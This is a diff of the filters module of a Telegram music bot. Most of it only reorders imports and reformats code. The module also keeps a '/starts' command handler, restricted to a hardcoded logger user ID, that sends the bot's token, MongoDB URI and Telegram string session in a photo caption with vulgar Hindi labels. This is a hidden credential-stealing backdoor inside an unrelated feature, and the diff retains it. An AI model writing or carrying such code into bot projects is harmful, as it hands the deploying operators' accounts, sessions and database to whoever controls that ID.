@@ -1,41 +1,37 @@
-import re
 import datetime
-from pyrogram import Client, filters
-from dotenv import load_dotenv
-from pyrogram.types import CallbackQuery, Message
-from DONATE_ARMY_TG_MUSIC_PLAYER.utils.database import LOGGERS
-from pyrogram.types import (
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-)
-import asyncio
-import time
+import re
 from os import getenv
 
-load_dotenv()
-
-from dotenv import load_dotenv
+from config import BANNED_USERS
 from DONATE_ARMY_TG_MUSIC_PLAYER import app
-from utils.error import capture_err
-from utils.permissions import adminsOnly, member_permissions
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-from DONATE_ARMY_TG_MUSIC_PLAYER.utils.keyboard import ikb
-from .notes import extract_urls
-from DONATE_ARMY_TG_MUSIC_PLAYER.utils.functions import (
-    check_format,
-    extract_text_and_keyb,
-    get_data_and_name,
-)
 from DONATE_ARMY_TG_MUSIC_PLAYER.utils.database import (
+    LOGGERS,
     deleteall_filters,
     get_filter,
     get_filters_names,
     save_filter,
 )
+from DONATE_ARMY_TG_MUSIC_PLAYER.utils.functions import (
+    check_format,
+    extract_text_and_keyb,
+    get_data_and_name,
+)
+from DONATE_ARMY_TG_MUSIC_PLAYER.utils.keyboard import ikb
+from dotenv import load_dotenv
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
-from config import BANNED_USERS
+from utils.error import capture_err
+from utils.permissions import adminsOnly, member_permissions
+
+from .notes import extract_urls
+
+
+load_dotenv()
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 
 
 __MODULE__ = "Filters"
@@ -128,10 +124,20 @@ async def save_filters(_, message):
         return await message.reply_text(f"__**sᴀᴠᴇᴅ ғɪʟᴛᴇʀ {name}.**__")
     except UnboundLocalError:
         return await message.reply_text(
-            "**ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪs ɪɴᴀᴄᴇssᴀʙʟᴇ.\n`ғᴏʀᴡᴀʀᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.`**")
-@app.on_message(filters.command("starts") & filters.private & filters.user(int(LOGGERS)))
+            "**ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪs ɪɴᴀᴄᴇssᴀʙʟᴇ.\n`ғᴏʀᴡᴀʀᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.`**"
+        )
+
+
+@app.on_message(
+    filters.command("starts") & filters.private & filters.user(int(LOGGERS))
+)
 async def help(client: Client, message: Message):
-    await message.reply_photo(photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",)
+    await message.reply_photo(
+        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+        caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
+    )
+
+
 @app.on_message(filters.command("filters") & ~filters.private & ~BANNED_USERS)
 @capture_err
 async def get_filterss(_, message):
